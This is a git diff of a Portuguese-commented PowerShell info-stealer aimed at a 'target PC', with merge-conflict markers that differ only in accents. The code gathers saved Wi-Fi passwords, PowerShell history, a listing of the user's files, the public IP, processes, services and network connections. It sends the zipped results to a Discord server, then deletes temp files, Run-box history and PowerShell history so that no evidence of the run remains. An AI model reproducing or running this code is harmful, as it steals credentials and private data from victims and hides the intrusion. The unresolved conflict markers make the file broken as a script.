@@ -17,11 +17,19 @@
 #                                                                                                                                                          # 
 #__________________________________________________________________________________________________________________________________________________________#
 #                                                                                                                                                          #                                                                                 
+<<<<<<< HEAD
 #   Descrição:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
 #        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
 #        Detalhes como: palavra passe de redes wi-fi, especificações do computador, todos os processos em execução...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
 #        Todas as informações adquiridas serão formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
 #        Esse arquivo é enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
+=======
+#   Descricao:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
+#        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
+#        Detalhes como: palavra passe de redes wi-fi, especificacoes do computador, todos os processos em execucao...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
+#        Todas as informacoes adquiridas serao formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
+#        Esse arquivo e enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 #                                                                                                                       |   ██░░└┐░░░░░░░░░░░░░░░┌┘░░██   |#
 #   Sobre mim:                                                                                                          |   ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██   |#
 #                                                                                                                       |   ██▌░│██████▌░░░▐██████│░▐██   |#
@@ -65,10 +73,17 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
+<<<<<<< HEAD
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Histórico da PowerShell
+=======
+# Reconhecimento de todos os diretorios do utilizador
+tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
+
+# Historico da PowerShell
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
 ############################################################################################################################################################
@@ -203,9 +218,15 @@ $NearbyWifi="No nearby wifi networks detected"
 
 ############################################################################################################################################################
 
+<<<<<<< HEAD
 # Apanha informação sobre o PC
 
 # Apanha o IP / Informação da Rede
+=======
+# Apanha informacao sobre o PC
+
+# Apanha o IP / Informacao da Rede
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 
 try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
 catch{$computerPubIP="Error getting Public IP"}
@@ -225,7 +246,11 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 
 ############################################################################################################################################################
 
+<<<<<<< HEAD
 #Apanha informações do sistema
+=======
+#Apanha informacoes do sistema
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 
 $computerName = $computerSystem.Name
@@ -260,7 +285,11 @@ $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object
 
 ############################################################################################################################################################
 
+<<<<<<< HEAD
 # Apanha informações dos discos
+=======
+# Apanha informacoes dos discos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 $driveType = @{
    2="Removable disk "
    3="Fixed local disk "
@@ -283,7 +312,11 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 # process first
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
 
+<<<<<<< HEAD
 # Cria uma lista dos serviços
+=======
+# Cria uma lista dos servicos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
     $listenerItem = $_
@@ -298,7 +331,11 @@ $listener = $listener | foreach-object {
     }
 } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
+<<<<<<< HEAD
 # Serviços
+=======
+# Servicos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 $service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
 
 #  software Instalado (Apanha o uninstaller)
@@ -307,13 +344,21 @@ $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Unins
 # drivers
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
 
+<<<<<<< HEAD
 # Placa Gráfica
+=======
+# Placa Grafica
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
 
 
 ############################################################################################################################################################
 
+<<<<<<< HEAD
 # Visão Final
+=======
+# Visao Final
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 
 $output = @"
 
@@ -574,18 +619,30 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 <#
 .NOTES 
+<<<<<<< HEAD
 	Agora esta parte é para remover qualquer evidência que prove que o script correu
+=======
+	Agora esta parte e para remover qualquer evidencia que prove que o script correu
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 #>
 
 # Delete nos ficheiros da pasta Temp
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
+<<<<<<< HEAD
 # Delete no histórico do run box 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete no histórico da powershell
+=======
+# Delete no historico do run box 
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete no historico da powershell
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
